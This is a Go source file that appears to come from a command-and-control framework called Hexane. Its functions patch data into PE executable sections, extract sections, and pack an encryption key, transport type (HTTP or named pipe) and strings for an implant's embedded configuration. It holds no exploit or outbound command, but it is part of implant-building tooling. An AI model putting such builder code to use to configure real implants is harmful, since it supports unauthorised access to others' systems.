package core

import (
	"debug/pe"
	"fmt"
	"os"
)

func (h *HexaneConfig) EmbedSectionData(readPath string, targetSection string, data []byte) error {
	var (
		readFile   	*os.File
		peFile 		*pe.File
		section 	*pe.Section
		secData   	[]byte
		err    		error
	)

	if readFile, err = os.OpenFile(readPath, FstatRW, 0644); err != nil {
		return err
	}
	defer readFile.Close()

	if peFile, err = pe.NewFile(readFile); err != nil {
		return err
	}
	defer peFile.Close()

	for _, s := range peFile.Sections {
		if s.Name == targetSection {
			section = s
			break
		}
	}

	if section == nil {
		return fmt.Errorf("section %s not found", targetSection)
	}

	if uint32(len(data)) > section.Size {
		return fmt.Errorf("section %s is not large enough", targetSection)
	}

	if secData, err = section.Data(); err != nil {
		return err
	}

	newSection := make([]byte, len(data))
	copy(newSection, secData)
	copy(newSection, data)

	if _, err = readFile.Seek(int64(section.Offset), os.SEEK_SET); err != nil {
		return err
	}

	if _, err = readFile.Write(newSection); err != nil {
		return err
	}

	return nil
}

func (h *HexaneConfig) CopySectionData(readPath string, outPath string, targetSection string) error {
	var (
		readFile   	*os.File
		peFile 		*pe.File
		section 	*pe.Section
		err    		error
	)

	if readFile, err = os.Open(readPath); err != nil {
		return err
	}
	defer readFile.Close()

	if peFile, err = pe.NewFile(readFile); err != nil {
		return err
	}

	for _, s := range peFile.Sections {
		if s.Name == targetSection {
			section = s
			break
		}
	}

	if section == nil {
		return fmt.Errorf("%s section was not found", targetSection)
	}

	outData := make([]byte, section.Size)

	if _, err = readFile.ReadAt(outData, int64(section.Offset)); err != nil {
		return err
	}

	if err = WriteFile(outPath, outData); err != nil {
		return err
	}

	return nil
}


func (h *HexaneConfig) GetEmbededStrings(strList []string) []byte {
	var stream = new(Stream)

	stream.PackString(string(h.Key))

	if h.Implant.ProfileTypeId == TRANSPORT_HTTP {
		stream.PackDword(1)
	} else if h.Implant.ProfileTypeId == TRANSPORT_PIPE {
		stream.PackDword(0)
	}

	stream.PackDword(1) // Ctx->LE == TRUE

	for _, str := range strList {
		stream.PackString(str)
	}

	return stream.Buffer
}

